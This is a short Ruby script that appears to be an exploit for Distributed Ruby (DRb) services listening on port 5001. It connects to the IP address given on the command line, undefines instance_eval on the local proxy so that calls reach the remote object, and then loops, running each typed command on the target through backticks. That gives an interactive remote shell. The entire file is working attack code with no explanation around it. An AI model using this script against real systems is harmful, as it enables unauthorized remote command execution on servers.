#!/usr/bin/ruby

require 'drb/drb'

ip = ARGV[0]
ARGV.clear

ro = DRbObject::new_with_uri("druby://" + ip + ":5001")
class << ro
  undef :instance_eval  # force call to be passed to remote object
end

while true
  print(">")
  command = gets.chomp
  print ro.instance_eval("` #{command} `")
end
